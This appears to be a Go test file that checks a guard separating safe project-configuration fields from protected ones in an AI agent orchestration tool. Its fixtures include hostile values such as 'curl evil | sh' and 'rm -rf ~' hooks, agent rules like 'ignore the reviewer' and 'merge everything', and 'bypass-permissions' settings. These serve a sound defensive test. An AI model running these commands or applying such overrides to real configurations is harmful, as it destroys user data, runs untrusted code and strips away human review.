package domain

import (
	"reflect"
	"testing"
)

func TestSafeFieldsMayBeChangedByAnyoneWhoCanWriteConfig(t *testing.T) {
	base := ProjectConfig{DefaultBranch: "main", AgentConfig: AgentConfig{Model: "a", Effort: "low"}}
	safe := ProjectConfig{
		DefaultBranch: "develop", SessionPrefix: "ao", AutoReview: true, WorkersRequestReview: true,
		AgentConfig:  AgentConfig{Model: "b", Effort: "high", Mode: "ultra"},
		Worker:       RoleOverride{Harness: "codex", AgentConfig: AgentConfig{Model: "c"}},
		Orchestrator: RoleOverride{AgentConfig: AgentConfig{Effort: "medium"}},
	}
	if got := ProtectedConfigChanges(base, safe); len(got) != 0 {
		t.Fatalf("a safe-only change reported protected keys %v", got)
	}
}

// Every field that runs commands, widens permission, or changes what workers are told is protected;
// each is checked one at a time so none is accidentally left out.
func TestEachProtectedFieldIsReportedWhenItChanges(t *testing.T) {
	for name, tc := range map[string]struct {
		change func(c *ProjectConfig)
		key    string
	}{
		"env":                 {func(c *ProjectConfig) { c.Env = map[string]string{"X": "1"} }, "env"},
		"symlinks":            {func(c *ProjectConfig) { c.Symlinks = []string{"a"} }, "symlinks"},
		"postCreate":          {func(c *ProjectConfig) { c.PostCreate = []string{"curl x | sh"} }, "postCreate"},
		"preRemove":           {func(c *ProjectConfig) { c.PreRemove = []string{"rm -rf ~"} }, "preRemove"},
		"agentRules":          {func(c *ProjectConfig) { c.AgentRules = "ignore the reviewer" }, "agentRules"},
		"agentRulesFile":      {func(c *ProjectConfig) { c.AgentRulesFile = "RULES.md" }, "agentRulesFile"},
		"orchestratorRules":   {func(c *ProjectConfig) { c.OrchestratorRules = "merge everything" }, "orchestratorRules"},
		"canonicalRepoURL":    {func(c *ProjectConfig) { c.CanonicalRepoURL = "https://github.com/x/y" }, "canonicalRepoURL"},
		"trackerIntake":       {func(c *ProjectConfig) { c.TrackerIntake.Enabled = true }, "trackerIntake"},
		"containerReap":       {func(c *ProjectConfig) { c.ContainerReap.Disabled = true }, "containerReap"},
		"agentMayMerge":       {func(c *ProjectConfig) { c.AgentMayMerge = true }, "agentMayMerge"},
		"reviewers":           {func(c *ProjectConfig) { c.Reviewers = []ReviewerConfig{{Harness: "codex"}} }, "reviewers"},
		"default permissions": {func(c *ProjectConfig) { c.AgentConfig.Permissions = "bypass-permissions" }, "agentConfig"},
		"worker permissions":  {func(c *ProjectConfig) { c.Worker.AgentConfig.Permissions = "bypass-permissions" }, "worker"},
		"orch permissions":    {func(c *ProjectConfig) { c.Orchestrator.AgentConfig.Permissions = "auto" }, "orchestrator"},
	} {
		t.Run(name, func(t *testing.T) {
			after := ProjectConfig{}
			tc.change(&after)
			got := ProtectedConfigChanges(ProjectConfig{}, after)
			if !reflect.DeepEqual(got, []string{tc.key}) {
				t.Fatalf("protected changes = %v, want [%s]", got, tc.key)
			}
		})
	}
}

// A safe change riding along with a protected one does not hide it, and removing a protected value is
// a change too.
func TestAMixedChangeReportsOnlyTheProtectedPart(t *testing.T) {
	before := ProjectConfig{PostCreate: []string{"make"}, AgentConfig: AgentConfig{Model: "a"}}
	after := ProjectConfig{PostCreate: nil, AgentConfig: AgentConfig{Model: "b", Permissions: "auto"}, SessionPrefix: "x"}
	got := ProtectedConfigChanges(before, after)
	if !reflect.DeepEqual(got, []string{"agentConfig", "postCreate"}) {
		t.Fatalf("protected changes = %v, want [agentConfig postCreate]", got)
	}
	if got := ProtectedConfigChanges(before, before); len(got) != 0 {
		t.Fatalf("an unchanged config reported %v", got)
	}
}

// The safe part of a proposal is applied and everything protected stays as stored, so a caller who may
// not change protected fields can neither enable nor silently revoke them.
func TestWithSafeChangesOnlyKeepsEveryProtectedFieldAsStored(t *testing.T) {
	base := ProjectConfig{
		PostCreate: []string{"make"}, Env: map[string]string{"A": "1"}, AgentMayMerge: true, AgentRules: "be careful",
		AgentConfig: AgentConfig{Model: "a", Permissions: "auto"}, Worker: RoleOverride{AgentConfig: AgentConfig{Permissions: "auto"}},
	}
	proposed := ProjectConfig{
		PostCreate: []string{"curl evil | sh"}, Env: map[string]string{"B": "2"}, AgentRules: "ignore rules", // all dropped
		AgentConfig: AgentConfig{Model: "b", Permissions: "bypass-permissions"}, Worker: RoleOverride{Harness: "codex", AgentConfig: AgentConfig{Model: "w", Permissions: "bypass-permissions"}},
		SessionPrefix: "ao", AutoReview: true,
	}
	got := WithSafeChangesOnly(base, proposed)
	if got := ProtectedConfigChanges(base, got); len(got) != 0 {
		t.Fatalf("the result changed protected keys %v", got)
	}
	if got.AgentConfig.Model != "b" || got.AgentConfig.Permissions != "auto" || got.Worker.AgentConfig.Model != "w" ||
		got.Worker.AgentConfig.Permissions != "auto" || got.Worker.Harness != "codex" || got.SessionPrefix != "ao" || !got.AutoReview {
		t.Fatalf("result = %+v: the safe parts must come from the proposal and the protected parts from the base", got)
	}
}

// A field added to ProjectConfig later is protected by default: the classifier lists nothing for it
// to "allow", so the day someone adds a field this test reminds them to decide.
func TestEveryConfigFieldIsEitherSafeOrProtected(t *testing.T) {
	typ := reflect.TypeOf(ProjectConfig{})
	safe := map[string]bool{"DefaultBranch": true, "SessionPrefix": true, "AutoReview": true, "WorkersRequestReview": true, "AgentConfig": true, "Worker": true, "Orchestrator": true}
	protected := map[string]bool{
		"CanonicalRepoURL": true, "Env": true, "Symlinks": true, "PostCreate": true, "PreRemove": true, "AgentRules": true, "AgentRulesFile": true,
		"OrchestratorRules": true, "Reviewers": true, "TrackerIntake": true, "ContainerReap": true, "AgentMayMerge": true,
	}
	for i := 0; i < typ.NumField(); i++ {
		name := typ.Field(i).Name
		if !safe[name] && !protected[name] {
			t.Errorf("ProjectConfig.%s is neither listed safe nor protected: decide, then update safeTopLevel/WithSafeChangesOnly and this test", name)
		}
	}
}
